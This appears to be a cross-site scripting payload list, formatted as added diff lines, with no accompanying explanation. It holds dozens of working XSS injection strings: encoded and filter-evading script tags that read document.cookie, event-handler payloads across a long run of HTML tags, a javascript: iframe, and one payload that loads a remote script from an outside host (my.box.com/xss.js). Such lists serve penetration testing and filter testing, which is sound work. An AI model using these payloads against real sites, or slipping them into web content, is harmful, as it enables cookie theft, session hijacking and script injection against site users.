++ACIAPgA8-script+AD4-confirm(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-confirm%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253econfirm(document.cookie)%253c/script%253e
+'><s'%2b'cript>confirm(document.cookie)</script>
+'><ScRiPt>confirm(document.cookie)</script>
+'><<script>confirm(document.cookie);//<</script>
+foo<script>confirm(document.cookie)</script>
+<scr<script>ipt>confirm(document.cookie)</scr</script>ipt>
+%22/%3E%3CBODY%20onload='document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
+'; confirm(document.cookie); var foo='
+foo\'; confirm(document.cookie);//';
+</script><script >confirm(document.cookie)</script>
+<img src=asdf onerror=confirm(document.cookie)>
+<BODY ONLOAD=confirm('XSS')>
+<script>confirm(1)</script>
+"><script>confirm(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=confirm(1)>
+<audio src=1 onerror=confirm(1)>
+<style>@keyframes slidein {}</style><a style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></a>
+<style>@keyframes slidein {}</style><abbr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></abbr>
+<style>@keyframes slidein {}</style><acronym style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></acronym>
+<style>@keyframes slidein {}</style><address style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></address>
+<style>@keyframes slidein {}</style><applet style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></applet>
+<style>@keyframes slidein {}</style><area style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></area>
+<style>@keyframes slidein {}</style><article style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></article>
+<style>@keyframes slidein {}</style><aside style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></aside>
+<style>@keyframes slidein {}</style><audio style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></audio>
+<style>@keyframes slidein {}</style><b style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></b>
+<style>@keyframes slidein {}</style><base style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></base>
+<style>@keyframes slidein {}</style><basefont style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></basefont>
+<style>@keyframes slidein {}</style><bdi style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></bdi>
+<style>@keyframes slidein {}</style><bdo style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></bdo>
+<style>@keyframes slidein {}</style><bgsound style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></bgsound>
+<style>@keyframes slidein {}</style><big style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></big>
+<style>@keyframes slidein {}</style><blink style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></blink>
+<style>@keyframes slidein {}</style><blockquote style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></blockquote>
+<style>@keyframes slidein {}</style><body style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></body>
+<style>@keyframes slidein {}</style><br style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></br>
+<style>@keyframes slidein {}</style><button style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></button>
+<style>@keyframes slidein {}</style><canvas style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></canvas>
+<style>@keyframes slidein {}</style><caption style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></caption>
+<style>@keyframes slidein {}</style><center style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></center>
+<style>@keyframes slidein {}</style><cite style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></cite>
+<style>@keyframes slidein {}</style><code style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></code>
+<style>@keyframes slidein {}</style><col style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></col>
+<style>@keyframes slidein {}</style><colgroup style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></colgroup>
+<style>@keyframes slidein {}</style><command style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></command>
+<style>@keyframes slidein {}</style><content style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></content>
+<style>@keyframes slidein {}</style><data style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></data>
+<style>@keyframes slidein {}</style><datalist style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></datalist>
+<style>@keyframes slidein {}</style><dd style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dd>
+<style>@keyframes slidein {}</style><del style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></del>
+<style>@keyframes slidein {}</style><details style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></details>
+<style>@keyframes slidein {}</style><dfn style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dfn>
+<style>@keyframes slidein {}</style><dialog style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dialog>
+<style>@keyframes slidein {}</style><dir style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dir>
+<style>@keyframes slidein {}</style><div style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></div>
+<style>@keyframes slidein {}</style><dl style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dl>
+<style>@keyframes slidein {}</style><dt style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></dt>
+<style>@keyframes slidein {}</style><element style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></element>
+<style>@keyframes slidein {}</style><em style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></em>
+<style>@keyframes slidein {}</style><embed style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></embed>
+<style>@keyframes slidein {}</style><fieldset style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></fieldset>
+<style>@keyframes slidein {}</style><figcaption style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></figcaption>
+<style>@keyframes slidein {}</style><figure style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></figure>
+<style>@keyframes slidein {}</style><font style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></font>
+<style>@keyframes slidein {}</style><footer style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></footer>
+<style>@keyframes slidein {}</style><form style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></form>
+<style>@keyframes slidein {}</style><frame style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></frame>
+<style>@keyframes slidein {}</style><frameset style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></frameset>
+<style>@keyframes slidein {}</style><h1 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></h1>
+<style>@keyframes slidein {}</style><head style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></head>
+<style>@keyframes slidein {}</style><header style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></header>
+<style>@keyframes slidein {}</style><hgroup style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></hgroup>
+<style>@keyframes slidein {}</style><hr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></hr>
+<style>@keyframes slidein {}</style><html style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></html>
+<style>@keyframes slidein {}</style><i style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></i>
+<style>@keyframes slidein {}</style><iframe style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></iframe>
+<style>@keyframes slidein {}</style><image style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></image>
+<style>@keyframes slidein {}</style><img style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></img>
+<style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></input>
+<style>@keyframes slidein {}</style><ins style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></ins>
+<style>@keyframes slidein {}</style><isindex style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></isindex>
+<style>@keyframes slidein {}</style><kbd style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></kbd>
+<style>@keyframes slidein {}</style><keygen style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></keygen>
+<style>@keyframes slidein {}</style><label style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></label>
+<style>@keyframes slidein {}</style><legend style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></legend>
+<style>@keyframes slidein {}</style><li style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></li>
+<style>@keyframes slidein {}</style><link style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></link>
+<style>@keyframes slidein {}</style><listing style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></listing>
+<style>@keyframes slidein {}</style><main style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></main>
+<style>@keyframes slidein {}</style><map style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></map>
+<style>@keyframes slidein {}</style><mark style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></mark>
+<style>@keyframes slidein {}</style><marquee style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></marquee>
+<style>@keyframes slidein {}</style><menu style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></menu>
+<style>@keyframes slidein {}</style><menuitem style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></menuitem>
+<style>@keyframes slidein {}</style><meta style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></meta>
+<style>@keyframes slidein {}</style><meter style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></meter>
+<style>@keyframes slidein {}</style><multicol style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></multicol>
+<style>@keyframes slidein {}</style><nav style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></nav>
+<style>@keyframes slidein {}</style><nextid style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></nextid>
+<style>@keyframes slidein {}</style><nobr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></nobr>
+<style>@keyframes slidein {}</style><noembed style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></noembed>
+<style>@keyframes slidein {}</style><noframes style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></noframes>
+<style>@keyframes slidein {}</style><noscript style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></noscript>
+<style>@keyframes slidein {}</style><object style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></object>
+<style>@keyframes slidein {}</style><ol style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></ol>
+<style>@keyframes slidein {}</style><option style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="prompt(1)"></option>
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+
